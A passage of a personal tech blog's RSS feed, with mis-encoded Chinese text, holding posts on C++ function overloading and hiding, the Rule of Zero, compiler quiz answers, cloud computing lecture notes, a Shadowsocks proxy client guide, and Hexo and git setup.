Derived::f()--20 //åºç±»æéæåå­ç±»å¯¹è±¡ï¼å¨æç»å®ï¼å­ç±»f()è¦çåºç±»çæ¬ãä½å½æ°åæ°é»è®¤å¼ï¼æ¯éæèç¼è¡ä¸ºï¼pBDçç±»åæ¯åºç±»æéï¼æä»¥ä½¿ç¨äºåºç±»çåæ°é»è®¤å¼ï¼æ³¨ææ­¤å¤ï¼
Base::g(float)--5 //éè¿å¯¹è±¡è°ç¨ï¼intè¢«æåä¸ºfloat
Base::g(Other&amp;amp;) //æ²¡ä»ä¹é®é¢ï¼åºç±»ä¸­ä¸ä¸ªgå½æ°ä¹é´çå³ç³»æ¯éè½½
Derived::g(int)--5 //æ²¡ä»ä¹é®é¢
Derived::g(int)--3 //æ³¨æåºç±»çg(float)å·²ç»è¢«éèï¼æä»¥ä¼ å¥çfloatåæ°è°ç¨çå´æ¯å­ç±»çg(int)æ¹æ³ï¼
Base::g(float)--5 //æ³¨æï¼pBDæ¯åºç±»æéï¼è½ç¶å®æåäºå­ç±»å¯¹è±¡ï¼ä½åºç±»ä¸­çæægå½æ°çæ¬å®æ¯å¯è§çï¼æä»¥pBD-&amp;gt;g(5)è°ç¨å°äºg(float)ï¼è½ç¶äº§çäºå¨æèç¼ä¹åçäºéèï¼ä½å­ç±»å¯¹è±¡çèè¡¨ä¸­ï¼ä»å¯ä»¥æ¾å°g(float)çå°åï¼å³åºç±»çæ¬ï¼
Base::g(float)--3.14159 //åçåä¸
//d.g(o)
//æ³¨ææ­¤å¤ï¼åæ³¨æä»£ç ä¸­è¢«æ³¨éäºçä¸è¡ï¼d.g(o)ä¸è½éè¿ç¼è¯ï¼å ä¸ºdæ¯å­ç±»å¯¹è±¡ï¼å¨å­ç±»ä¸­ï¼åºç±»ä¸­å®ä¹çä¸ä¸ªgå½æ°çæ¬é½è¢«éèäºï¼ç¼è¯æ¶ä¸å¯è§ï¼ä¸ä¼éè½½
Base::g(Other&amp;amp;) const //pCæ¯æåconstå¯¹è±¡çæéï¼å°è°ç¨constçæ¬çgå½æ°
Base::g(Other&amp;amp;) const //pCCPæ¯æåconstå¯¹è±¡çconstæéï¼ä¹è°ç¨constçæ¬çgå½æ°
Base::g(Other&amp;amp;) //pCPæ¯æåécosntå¯¹è±¡çconstæéï¼ç±äºä¸æåconstå¯¹è±¡ï¼è°ç¨éconstçæ¬çgå½æ°
&lt;/code>&lt;/pre>
&lt;p>ä¸è¿°ç»æï¼æ¯å¦åé¢æ³çæ¯å¦åæäºåºå¥å¢ï¼é®é¢ä¸»è¦éä¸­äºç»æçç¬¬5ã12ã13å15è¡ã&lt;/p>
&lt;p>ç¬¬5è¡è¾åºç»æè¯æï¼&lt;strong>å½å½æ°åæ°æé»è®¤å¼ï¼ååçå¤æè¡ä¸ºæ¶ï¼å½æ°åæ°é»è®¤å¼æ¯éæè¡ä¸ºï¼å¨ç¼è¯æ¶å°±å·²ç»ç¡®å®ï¼å°ä½¿ç¨åºç±»çæ¬çå½æ°åæ°é»è®¤å¼èä¸æ¯å­ç±»ç&lt;/strong>ã&lt;/p>
&lt;p>èç¬¬12ã13ã15è¡è¾åºç»æåè¯´æï¼å°½ç®¡å·²ç»è¯ææä»¬ä¹åè¯´çéèæ¯æ­£ç¡®çï¼å ä¸ºd.g(o)ä¸å¯ä»¥éè¿ç¼è¯ï¼ç¡®å®åçäºéèï¼ï¼ä½å´å¯ä»¥**å©ç¨åºç±»æéæåæ´¾çç±»å¯¹è±¡åï¼æ¥ç»å¼è¿ç§éå¶ï¼**ä¹å°±æ¯è¯´ï¼ç¼è¯å¨æ ¹æ®åæ°å¹éå½æ°ååçæ¶åï¼æ¯å¨ç¼è¯æ¶æ ¹æ®æéçç±»åï¼æå¯¹è±¡çç±»åæ¥ç¡®å®ï¼æéç±»åæ¯åºç±»ï¼é£ä¹åºç±»ä¸­çgå½æ°çæ¬å°±æ¯å¯è§çï¼æéç±»åæ¯å­ç±»ï¼ç±äºåçäºéèï¼åºç±»ä¸­çgå½æ°çæ¬å°±æ¯ä¸å¯è§çãèå°å¨æç»å®æ¶ï¼åºç±»æéæåäºå­ç±»å¯¹è±¡ï¼å¨å­ç±»å¯¹è±¡çèå½æ°è¡¨ä¸­ï¼å°±å¯ä»¥æ¾å°åºç±»ä¸­gèå½æ°çå°åã&lt;/p>
&lt;p>åå°è¿éï¼ä¸ç¥éè¯»èæ¯å¦å·²ç»æç½ï¼è¿äºç»æ¥ç»å»çå³ç³»ãå¨å®éä»£ç è¿ç¨ä¸­ï¼å¯è½å¹¶ä¸ä¼ååºå«æè¿ä¹å¤âé·é±âçæµè¯ä»£ç ï¼æä»¬åªè¦å¼æ¸æ¥éè½½ãè¦çåéèçå·ä½ç¹å¾ï¼å¹¶å¤´èæ¸éå°ç¥éï¼æç°å¨éè¦çæ¯åªä¸ç§åè½ï¼éå¸¸ä¹ä¸ä¼éè¦éèï¼ï¼å°±è½ååºæ¸æçä»£ç ãä¸é¢çä»£ç å¶å®æ¯ä¸ä¸ªç³ç³çä¾å­ï¼å ä¸ºå¨è¿ä¸ªä¾å­ä¸­ï¼éè½½ãè¦çãéèå¹¶å­ï¼æä»¬ç¼åä»£ç ï¼å°±æ¯è¦å°½å¯è½é²æ­¢è¿ç§å«æ··ä¸æ¸çæåµåçã&lt;/p>
&lt;p>è®°ä½ä¸ä¸ªååï¼&lt;strong>æ¯ä¸ä¸ªæ¹æ³ï¼åè½åèè´£å°½å¯è½åä¸ï¼å¦åï¼å°è¯å°å®æåæä¸ºå¤ä¸ªæ¹æ³&lt;/strong>ã&lt;/p></description></item><item><title>C++ä¹Rule of Zero</title><link>http://www.guozet.me/post/C++-Rule-of-Zero/</link><pubDate>Wed, 05 Sep 2018 10:14:31 +0000</pubDate><guid>http://www.guozet.me/post/C++-Rule-of-Zero/</guid><description>&lt;!-- TODO:çè§£Rule of Zeroççæ­£å«ä¹ -->
&lt;p>Classes that have custom destructors, copy/move constructors or copy/move assignment operators should deal exclusively with ownership (which follows from the
&lt;a href="https://en.wikipedia.org/wiki/Single_responsibility_principle" title="enwiki:Single responsibility principle" target="_blank" rel="noopener">Single Responsibility Principle&lt;/a>). Other classes should not have custom destructors, copy/move constructors or copy/move assignment operators.
&lt;a href="https://en.cppreference.com/w/cpp/language/rule_of_three#cite_note-1" target="_blank" rel="noopener">[1]&lt;/a>&lt;/p>
&lt;pre>&lt;code class="language-cpp">class rule_of_zero {
std::string cppstring;
public:
rule_of_zero(const std::string&amp;amp; arg) : cppstring(arg) {}
};
&lt;/code>&lt;/pre>
&lt;p>When a base class is intended for polymorphic use, its destructor may have to be declared public and virtual. This blocks implicit moves (and deprecates implicit copies), and so the special member functions have to be declared as defaulted
&lt;a href="https://en.cppreference.com/w/cpp/language/rule_of_three#cite_note-2" target="_blank" rel="noopener">[2]&lt;/a>&lt;/p>
&lt;pre>&lt;code class="language-cpp">class base_of_five_defaults {
public:
base_of_five_defaults(const base_of_five_defaults&amp;amp;) = default;
base_of_five_defaults(base_of_five_defaults&amp;amp;&amp;amp;) = default;
base_of_five_defaults&amp;amp; operator=(const base_of_five_defaults&amp;amp;) = default;
base_of_five_defaults&amp;amp; operator=(base_of_five_defaults&amp;amp;&amp;amp;) = default;
virtual ~base_of_five_defaults() = default;
};
&lt;/code>&lt;/pre>
&lt;p>however, this can be avoided if the objects of the derived class are not dynamically allocated, or are dynamically allocated only to be stored in a
&lt;a href="https://en.cppreference.com/w/cpp/memory/shared_ptr" title="cpp/memory/shared ptr" target="_blank" rel="noopener">std::shared_ptr&lt;/a> (such as by
&lt;a href="https://en.cppreference.com/w/cpp/memory/shared_ptr/make_shared" title="cpp/memory/shared ptr/make shared" target="_blank" rel="noopener">std::make_shared&lt;/a>): shared pointers invoke the derived class destructor even after casting to &lt;code>std::shared_ptr&amp;lt;Base&amp;gt;&lt;/code>.&lt;/p></description></item><item><title>ç¼è¯åç---ç¼è¯å¨æ¦å¿µ</title><link>http://www.guozet.me/post/CPSC8270-Quiz1/</link><pubDate>Wed, 05 Sep 2018 10:14:31 +0000</pubDate><guid>http://www.guozet.me/post/CPSC8270-Quiz1/</guid><description>&lt;p>Quiz 1 Date: 09/06/2018&lt;/p>
&lt;h2 id="some-questions-about-the-paper">Some questions about the paper&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>What is grammarware?
Grammarware comprises grammars and grammar-dependent software.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What is Chomskys controversial definition of the âuniversal grammar?â
He think that the essence of human language is the system of principles, conditions, and rules that are elements or properties of all human languages.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Basically, whatâs the âresearch agendaâ described in the paper?
It promotes an engineering discipline for grammarware.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The authors claim that âGrammarware seems to be second-class software.â What do they mean by this? (talk about refactoring)
Grammarware seems to be second-class software. For instance, program refactoring is a well-established practice according to modern object-oriented methodology. By contrast, grammar refactoring is weakly understood and hardly practiced.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The authors ask the question: âwhat is a good grammar?â How would you address this issue?
A good grammar can help programmers to automate many tasks that are tedious and error prone when performed manually. Can help the programmers to find each set of string in the computer languages.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Def: Formally, a grammar G is a four tu-ple (N, T, S, P) where N &amp;amp; T are disjount sets of symbols known as non-terminals and terminals, S â N is the start symbol, and P is a relation on N âª T of production rules.&lt;/p>
&lt;ul>
&lt;li>
&lt;p>N : non-terminals are generally represented as cap letters, and do not appear in the language; they are used to derive sentences in the language.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>T : terminals are symbols in the language&lt;/p>
&lt;/li>
&lt;li>
&lt;p>S is one of the non-terminals that indicates where to start when deriving a sentence in the language.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>P : rules used to derive a sentence.&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>Courses Cloud Computing Introduce 1</title><link>http://www.guozet.me/post/Cloud-Computing-introduce/</link><pubDate>Mon, 27 Aug 2018 10:14:31 +0000</pubDate><guid>http://www.guozet.me/post/Cloud-Computing-introduce/</guid><description>&lt;p>8/23/2018&lt;/p>
&lt;ul>
&lt;li>Welcome, course overview, account setup, course logistics (20 minutes)&lt;/li>
&lt;li>1.01 What is Cloud Computing (30 minutes)&lt;/li>
&lt;li>AWS Management Console demo&lt;/li>
&lt;li>&lt;em>Access the student materials at
&lt;a href="https://www.google.com/url?q=https%3A%2F%2Fawsacademy.qwiklab.com%2F&amp;amp;sa=D&amp;amp;sntz=1&amp;amp;usg=AFQjCNGTi6DJo_tzl6XTUSgCHuJfeCKqdg" target="_blank" rel="noopener">https://awsacademy.qwiklab.com (Links to an external site.)Links to an external site.&lt;/a>&lt;/em>&lt;/li>
&lt;li>Registration link &amp;ndash; will be provided in email to class participants&lt;/li>
&lt;li>
&lt;a href="https://www.google.com/url?q=https%3A%2F%2Fwww.dropbox.com%2Fs%2F2juvuht9g3o1ali%2F20160823%2520AWS%2520Academy%2520getting%2520started%2520for%2520students.pdf%3Fdl%3D0&amp;amp;sa=D&amp;amp;sntz=1&amp;amp;usg=AFQjCNFxciRZikyEAl9sJswYihv5mjs_hA" target="_blank" rel="noopener">AWS Getting Started (Links to an external site.)Links to an external site.&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Homework:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>AFTER EVERY LECTURE: Do the assessment(s) associated with the lecture slides just covered even if not listed in the Homework. Become familiar with the terms and concepts listed for each class period.&lt;/strong>&lt;/li>
&lt;li>For today&amp;rsquo;s lecture, do the Assessment for Lecture 1.&lt;/li>
&lt;li>Read
&lt;a href="https://www.google.com/url?q=https%3A%2F%2Fwww.ibm.com%2Fblogs%2Fcloud-computing%2F2014%2F02%2Fcloud-computing-basics%2F&amp;amp;sa=D&amp;amp;sntz=1&amp;amp;usg=AFQjCNGCcrgBpw3vKMKLB7EZ7Gv8GFmQRQ" target="_blank" rel="noopener">Cloud computing basics (Links to an external site.)Links to an external site.&lt;/a>&lt;/li>
&lt;li>Read:
&lt;a href="http://www.google.com/url?q=http%3A%2F%2Fieeexplore.ieee.org%2Fdocument%2F5331755%2F&amp;amp;sa=D&amp;amp;sntz=1&amp;amp;usg=AFQjCNGj8YdvO-L3HtZv0kBGQ4zUg-8wDQ" target="_blank" rel="noopener">Taxonomy and Survey of Cloud Computing Systems (Links to an external site.)Links to an external site.&lt;/a> and be prepared to answer questions about it on the Exam.&lt;/li>
&lt;li>Some terms everyone should know: on-demand self service, resource pooling, elasticity, measured service, SAAS, PAAS, IAAS, HAAS public/private/hybrid types of clouds, virtualization, hypervisor, stateful versus stateless services, cloud business model, on-premises/on-prem, enterprise application, &lt;strong>pay as you go&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h1 id="introduce">Introduce&lt;/h1>
&lt;h2 id="what-is-the-cloud-computing">What is the Cloud Computing?&lt;/h2>
&lt;p>Cloud computing is a model for enabling convenient, on-demand network access to a shared pool of configurable computing resources (e.g. networks, servers, applications, and services) that can be rapidly provisioned and released with minimal management effort or service provider interaction.&lt;/p>
&lt;h2 id="some-keywords">Some keywords&lt;/h2>
&lt;h3 id="five-characteristics">Five Characteristics&lt;/h3>
&lt;p>&lt;strong>On-demand self-service&lt;/strong>&lt;/p>
&lt;p>This means provisioning or de-provisioning computing resources as needed in an automated fashion without human intervention [n. ä»å¥ï¼è°åï¼å¦¨ç¢]. An analogy to this is electricity as a utility where a consumer can turn on or off a switch on-demand to use as much electricity as required.&lt;/p>
&lt;p>&lt;strong>Resource Pooling&lt;/strong>&lt;/p>
&lt;p>This means that computing resources are pooled to meet the demand of the consumers so that resources (physical or virtual) can be dynamically assigned, reassigned or de-allocated as per the requirement. Generally the consumers are not aware of the exact location of computing resources. However, they may be able to specify location (country, city, region and the like) for their need. For example, I as a consumer might want to host my services with a cloud provider that has cloud data centers within the boundaries of Australia.&lt;/p>
&lt;p>&lt;strong>Ubiquitous[adj. æ®éå­å¨çï¼æ æä¸å¨ç] network access&lt;/strong>&lt;/p>
&lt;p>This means that computing facilities can be accessed from anywhere over the network using any sort of thin or thick clients (for example smartphones, tablets, laptops, personal computers and so on).&lt;/p>
&lt;p>&lt;strong>Elasticity&lt;/strong>&lt;/p>
&lt;p>Cloud computing provides an illusion of infinite computing resources to the users. In cloud models, resources can be elastically provisioned or released according to demand.&lt;/p>
&lt;p>&lt;strong>Measured service&lt;/strong>&lt;/p>
&lt;p>This means that consumers only pay for the computing resources they have used. This concept is similar to utilities like water or electricity.&lt;/p>
&lt;hr>
&lt;h3 id="three-main-service-models-of-cloud-computing-cloud-architecture">Three main service models of cloud computing (Cloud Architecture)&lt;/h3>
&lt;p>&lt;strong>XaaS&lt;/strong> offerings where X is Software, Hardware, Platform, Infrastructure, Data, Business etc.&lt;/p>
&lt;p>&lt;strong>SAAS&lt;/strong>&lt;br>
Software as a service (SaaS). Applications hosted by a provider on a cloud infrastructure are accessed from thin or thick clients over the network or a program interface (for example, web services). Examples are Google Docs, IBM SmartCloud Docs, IBM SmartCloud Meetings, Saleforce.comâs CRM application and so on.&lt;/p>
&lt;p>&lt;strong>PAAS&lt;/strong>&lt;br>
Platform as a service (PaaS). Providers deliver not only infrastructure but also middleware (databases, messaging engines and so on) and solution stacks for application build, development and deploy. IBM SmartCloud Application Services and Google App Engine are two examples of PaaS.&lt;/p>
&lt;p>&lt;strong>IAAS&lt;/strong>&lt;br>
Infrastructure as a service (IaaS). It is the delivery of computing infrastructure as a service. IBM SmartCloud Enterprise+, SoftLayer cloud and Amazon EC2 are some examples of IaaS.&lt;/p>
&lt;p>&lt;strong>HAAS&lt;/strong>&lt;br>
Hardware as a service (HaaS) refers to managed services or grid computing, where computing power is leased from a central provider. In each case, the HaaS model is similar to other service-based models, where users rent, rather than purchase, a provider&amp;rsquo;s tech assets.&lt;/p>
&lt;p>There are others services emanating from these main services. Storage as a service &lt;strong>(STaaS)&lt;/strong> and communications as a service &lt;strong>(CaaS)&lt;/strong> are two such variants.&lt;/p>
&lt;h3 id="four-cloud-deployment-models-publicprivatehybrid-types-of-clouds">Four cloud deployment models( public/private/hybrid types of clouds)&lt;/h3>
&lt;p>&lt;strong>Public cloud&lt;/strong>&lt;/p>
&lt;p>This is where computing resources provided by a cloud provider are used by different organizations through public Internet on a &lt;strong>pay as you go (PAYG)&lt;/strong> model. Cloud providers ensure some sort of separation for resources used by different organizations. This is known as multitenancy [n. å¤ç§æ·ææ¯].&lt;/p>
&lt;p>&lt;strong>Private cloud&lt;/strong>&lt;/p>
&lt;p>This is where cloud infrastructure is solely owned by an organization and maintained either by this organization or a third party and can be located on site or off-site. Computing resources are behind the corporate firewall.&lt;/p>
&lt;p>&lt;strong>Community cloud&lt;/strong>&lt;/p>
&lt;p>Here, cloud infrastructure is owned and shared by multiple organizations with a shared concern.&lt;/p>
&lt;p>&lt;strong>Hybrid cloud&lt;/strong>&lt;/p>
&lt;p>It is the combination of any type of cloud model mentioned above connected by standardized or proprietary technology.&lt;/p>
&lt;h3 id="virtualization">Virtualization&lt;/h3>
&lt;p>&lt;strong>Virtualization Management&lt;/strong> is the technology that abstracts the coupling between the hardware and operating system. It refers to the abstraction of logical resources away from their underlying physical resources in order to improve agility, flexibility, reduce costs and thus enhance busines valuse. Basically virtualizations in cloud are of different types such as server virtualization, storage virtuualization and network virtualization.&lt;/p>
&lt;p>For example, a common interpretation of server virtualization is the mapping of single physical resources to multiple logical representations or partitions.&lt;/p>
&lt;h3 id="hypervisor">Hypervisor&lt;/h3>
&lt;p>Weâve heard the term hypervisor, of course, when talking of virtualization and the Cloud. Hypervisors allow a single set of physical hardware to host multiple virtual machines, and hold all of the necessary variables and information required to make those virtual machines work. But what is a Hypervisor actually, what does a Hypervisor do, and how does it make the Cloud possible? Letâs have a look:&lt;/p>
&lt;p>In their simplest form, hypervisors are software, specialized firmware, or both which allow physical hardware to be shared across multiple virtual machines. The way the hypervisor does this will vary from vendor to vendor â like ESXi from WMware or Hyper-V from Microsoft, but they all accomplish the same task. Each takes one set of physical hardware (CPU, RAM, disk drives, peripherals, etc.) and allows it to be simultaneously used by multiple instances of Operating Systems (Windows, Linux, etc.).&lt;/p>
&lt;p>There are two major classifications of hypervisors to be aware of. Type 1 and Type 2 both do the same basic task, but the way they do it is quite different from each other.&lt;/p>
&lt;h3 id="stateful-versus-stateless-services">stateful versus stateless services&lt;/h3>
&lt;p>I assume you are referring to Security Groups (stateful) and Access Control Lists (stateless) in Ryan&amp;rsquo;s videos. My understanding is:&lt;/p>
&lt;p>Security Groups control connectivity to and from an EC2 instance or instances whereas ACLs control connectivity to and from a subnet.&lt;/p>
&lt;p>Stateful = any connection inbound will also allow the response to be returned outbound without additional rules or will override an explicit DENY.&lt;/p>
&lt;p>Stateless = you must explicitly ALLOW traffic in both directions.&lt;/p>
&lt;h3 id="cloud-business-model">cloud business model&lt;/h3>
&lt;h3 id="on-premiseson-prem">on-premises/on-prem&lt;/h3>
&lt;p>On-premises software (sometimes misspelled &amp;ldquo;on-premise&amp;rdquo; or abbreviated as &amp;ldquo;on-prem&amp;rdquo;) is installed and runs on computers on the premises (in the building) of the person or organization using the software, rather than at a remote facility such as a server farm or cloud. On-premises software is sometimes referred to as âshrinkwrapâ software, and off-premises software is commonly called âsoftware as a serviceâ (&amp;ldquo;SaaS&amp;rdquo;) or âcloud computingâ.&lt;/p>
&lt;h3 id="enterprise-application">enterprise application&lt;/h3>
&lt;p>Enterprise application integration is an integration framework composed of a collection of technologies and services which form a middleware or &amp;ldquo;middleware framework&amp;rdquo; to enable integration of systems and applications across an enterprise.&lt;/p>
&lt;h3 id="pay-as-you-go">pay as you go&lt;/h3>
&lt;p>Pay-as-you-go cloud computing (PAYG cloud computing) is a payment method for cloud computing that charges based on usage. The practice is similar to that of utility bills, using only resources that are needed.&lt;/p>
&lt;h2 id="some-websites-links">Some websites links&lt;/h2>
&lt;p>There are some courses on this website. -
&lt;a href="https://www.aws.training/" target="_blank" rel="noopener">AWS Training&lt;/a>&lt;/p>
&lt;ul>
&lt;li>AWS lab:
&lt;a href="https://awsacademy.qwiklab.com/home" target="_blank" rel="noopener">awsacademy.qwiklabs.com&lt;/a>
Use lab on this website&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h1 id="aws-core-services">Aws Core services&lt;/h1>
&lt;p>Elastic Load Balancing, Amazon CloudWatch, and Auto Scaling.&lt;/p>
&lt;h2 id="elastic-load-balancingelb---traffic-copäº¤éè­¦å¯">Elastic Load Balancing(ELB)&amp;ndash; Traffic cop(äº¤éè­¦å¯)&lt;/h2>
&lt;p>ELB can automatically distributes incoming application traffic across multiple targets(Like Amazon EC2 Instances, Containers, and IP address).&lt;/p>
&lt;h3 id="how-to-distribute-traffic-across-elb">How to distribute traffic across ELB&lt;/h3>
&lt;h3 id="auto-scaling-to-launch-and-release-servers">Auto Scaling to launch and release servers&lt;/h3>
&lt;h3 id="how-cloudwatch-enables-you-to-monitor-aws-resources-and-applications-in-real-time">How CloudWatch enables you to monitor AWS resources and applications in real time.&lt;/h3></description></item><item><title>vpn-Shadowsocksä½¿ç¨æç¨</title><link>http://www.guozet.me/post/vpn-client/</link><pubDate>Thu, 23 Aug 2018 16:14:31 +0000</pubDate><guid>http://www.guozet.me/post/vpn-client/</guid><description>&lt;h1 id="shadowsocksä½¿ç¨æç¨">Shadowsocksä½¿ç¨æç¨&lt;/h1>
&lt;h2 id="æµè§å¨æä»¶">æµè§å¨æä»¶&lt;/h2>
&lt;p>ä¾ç¶è®°å¾èªå·±ä½¿ç¨ãçº¢æãççå¿«ä½éªââåªä¸ªç½ç«ä¸è½è®¿é®äºï¼æä¸å¾æ æ·»å å°è§ååè¡¨ä¸­ï¼å°±å¯ä»¥ãç§å­¦ãå°è®¿é®äºãè¿ç§æ ç¼çä½éªï¼é  Shadowsocks å å¦ä¸æ¬¾ Chrome æ©å± SwitchyOmega ä¹è½å®ç°ï¼è¿éæ¯
&lt;a href="https://github.com/FelisCatus/SwitchyOmega/wiki/GFWList" target="_blank" rel="noopener">ä½¿ç¨æç¨&lt;/a>ã&lt;/p>
&lt;h3 id="windowsæ¡é¢åºç¨">Windowsæ¡é¢åºç¨&lt;/h3>
&lt;p>é¨ç½² Shadowsocks å®æåï¼æµè§å¨å°±è½å®ç°ç§å­¦ä¸ç½äºï¼ä½æ¯å Dropbox ç­æ¡é¢åºç¨çæµéï¼è¿ä¸è½ç± Shadowsocks æ¥ä»£çãè¦å®ç°æ¡é¢åºç¨çä»£çï¼éè¦ååå©å¶ä»åºç¨ï¼æ¯å¦
&lt;a href="https://www.proxifier.com/" target="_blank" rel="noopener">Proxifier&lt;/a>ã
&lt;a href="https://nssurge.com/" target="_blank" rel="noopener">Surge for Mac&lt;/a>ã&lt;/p>
&lt;h3 id="ææºç«¯åºç¨">ææºç«¯åºç¨&lt;/h3>
&lt;p>å®åææºåªéè¦ä¸è½½å®è£
&lt;a href="https://github.com/shadowsocks/shadowsocks-android/releases" target="_blank" rel="noopener">Shadowsocks å®åç&lt;/a>ï¼å¹¶ä¸æ¡é¢çä¸æ ·ï¼å¡«å¥æå¡å¨ IPãç«¯å£ãå¯ç åå å¯æ¹å¼ï¼å°±å¯ä»¥è®¾ç½®å¨å±æååºç¨ä»£çãä½æ¯è¦å®ç°ãçæ­£æä¹ä¸ãç PAC è§åçè¯ï¼ä¹å°±æ¯èªå®ä¹åªäºååèµ°ä»£çãåªäºä¸èµ°ï¼ï¼ç®åä¼¼ä¹è¿æ²¡æä¸ä¸ªä¾¿æ·å¯è¡çè§£å³æ¹æ¡ã&lt;/p>
&lt;p>iOS å¯ä»¥éè¿ç±»
&lt;a href="https://itunes.apple.com/us/app/surge-3-web-developer-tool/id1329879957?ls=1&amp;amp;mt=8" target="_blank" rel="noopener">Surge&lt;/a> ç App å®ç° PAC è§åä¸çèªå¨ç¿»å¢ã&lt;/p>
&lt;p>Surge ç®åå®ä»· 328 åï¼å¦æ Mac çï¼å¦å¤æ¶è´¹ï¼ãä½ä¸ºä¸æ¬¾å¼å·ãç§å­¦ä¸ç½ãåè½çç½ç»å¼åè°è¯å©å¨ï¼å®å®å¨å¼è¿ä¸ªä»·ãè§å¾å¤ªè´µçè¯ï¼å¯ä»¥ä½¿ç¨ç¸å¯¹ä¾¿å®ç
&lt;a href="https://itunes.apple.com/us/app/wingy-smart-proxy-for-http/id1148026741?mt=8" target="_blank" rel="noopener">Wingy&lt;/a> æè
&lt;a href="https://itunes.apple.com/us/app/potatso-2/id1162704202?mt=8" target="_blank" rel="noopener">Potatso&lt;/a>ï¼ä¸è¿äºèé½æ²¡æåèæ¥å¾ç¨³å®å¥½ç¨ã&lt;/p></description></item><item><title>Leetcode Solutions(Updating)</title><link>http://www.guozet.me/post/All-Leetcode/</link><pubDate>Fri, 17 Aug 2018 01:02:39 +0000</pubDate><guid>http://www.guozet.me/post/All-Leetcode/</guid><description>&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-08-10-All-Leetcode/2019-01-09-19-22-01.png" alt="">&lt;/p>
&lt;p>I have solved &lt;strong>SOLVEDNUMBER / 1020&lt;/strong> problems. I use this page to record the questions which I did on the Leetcode.&lt;/p>
&lt;p>&lt;strong>Last Updated:&lt;/strong> UPDATETIMESTAMP&lt;/p>
&lt;p>Please access my
&lt;a href="http://guozet.me/leetcode/" target="_blank" rel="noopener">Leetcode Gitbook&lt;/a> to git all posts about leetcode.&lt;/p>
&lt;blockquote>
&lt;p>This table include: Question Number, Questions Name, Question Difficulty, Question Type, And when I did it.&lt;/p>
&lt;/blockquote>
&lt;!-- more -->
&lt;style>
table th:nth-of-type(1) {
width: 45px;
}
table th:nth-of-type(2) {
width: 50%;
}
&lt;/style>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th align="left">#&lt;/th>
&lt;th align="left">Title&lt;/th>
&lt;th align="left">Difficulty&lt;/th>
&lt;th align="left">Topics&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;/table></description></item><item><title>Hexo+Github+Travis CIå®æåå®¢çèªå¨é¨ç½²</title><link>http://www.guozet.me/post/hexo-and-travisci-to-implement-auto-setting/</link><pubDate>Thu, 09 Aug 2018 14:14:14 +0000</pubDate><guid>http://www.guozet.me/post/hexo-and-travisci-to-implement-auto-setting/</guid><description>&lt;blockquote>
&lt;p>å¾å¤æ¶åæä»¬æ¯éè¦å¨ä¸åççµèä¸é¢ä¹¦åæä»¬çåå®¢ï¼ä½æ¯æ¯æ¬¡é½è¦éç½®Hexoçç¯å¢çè¯ï¼è¿å°±æ¯ä¸ä»¶éå¸¸å´©æºçäºæï¼æä»¥æä»¬éè¦å©ç¨æä»¬çç¥è¯å®æèªå¨åé¨ç½²ã&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>åçï¼&lt;/strong> å¨githubä¸é¢åå»ºBlogçrepo, ä½¿ç¨masteråæ¯ä½ä¸ºåå®¢åæ¯ï¼ä½¿ç¨hexoæ¥ä½ä¸ºæºæä»¶ä¿å­åæ¯ï¼å°è¯¥repoçtoken key æä¾ç»Travisä¹åï¼Travis CIå¹³å°æ£æµä½ çhexoåæ¯æ°æ®ååçæ¶åï¼å°±ä¼æ§è¡ä½ å®ä¹çèæ¬ãï¼å¨è¿ä¸ªèæ¬ä¸­ï¼å®æåå®¢åå¸çåå®¹ï¼&lt;/p>
&lt;h2 id="ä½¿ç¨travis-ci">ä½¿ç¨Travis CI&lt;/h2>
&lt;p>&lt;img src="2018-08-09-14-22-10.png" alt="">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/img/2018-08-09-14-27-35.png" alt="">
&lt;img src="http://www.guozet.me/images/in-post/2018-08-09-14-31-29.png" alt="">&lt;/p>
&lt;p>&lt;img>2018-08-09-hexo-and-travisci-to-implement-auto-setting_2018-08-09-14-36-40.png&lt;/img>&lt;/p></description></item><item><title>How to config git on Ubuntu</title><link>http://www.guozet.me/post/How-to-config-git-on-Ubuntu/</link><pubDate>Thu, 09 Aug 2018 13:42:10 +0000</pubDate><guid>http://www.guozet.me/post/How-to-config-git-on-Ubuntu/</guid><description>&lt;h2 id="git-command">Git command&lt;/h2>
&lt;h3 id="branch-operation">Branch operation&lt;/h3>
&lt;ol>
&lt;li>Background: We often want the copy the &lt;code>master&lt;/code> branch(or other branch) to develop a new function.&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-bash">$git checkout master //Change to the master branch or which branch you want to copy
$git pull //ä»è¿ç«¯æåææ°çæ¬
$git checkout -b NewBranch //Switched to a new branch 'NewBranch'
$git push origin NewBranch //æ°å»ºåæ¯NewBranchå°è¿ç«¯
&lt;/code>&lt;/pre>
&lt;h2 id="issues">Issues&lt;/h2>
&lt;h3 id="git-pull-error">git pull error&lt;/h3>
&lt;pre>&lt;code class="language-sh">$git pull
There is no tracking information for the current branch.
Please specify which branch you want to merge with.
See git-pull(1) for details.
git pull &amp;lt;remote&amp;gt; &amp;lt;branch&amp;gt;
If you wish to set tracking information for this branch you can do so with:
git branch --set-upstream-to=origin/&amp;lt;branch&amp;gt; NewBranch
&lt;/code>&lt;/pre>
&lt;p>&lt;strong>solution&lt;/strong>
&lt;code>$git branch --set-upstream-to=origin/NewBranch&lt;/code>
&lt;code>$git pull&lt;/code>
&lt;code>$git push origin test:test&lt;/code>&lt;/p>
&lt;h2 id="git-configure-on-ubuntu">Git configure on Ubuntu&lt;/h2>
&lt;h3 id="add-git-branch-name-if-its-present">Add git branch name if its present&lt;/h3>
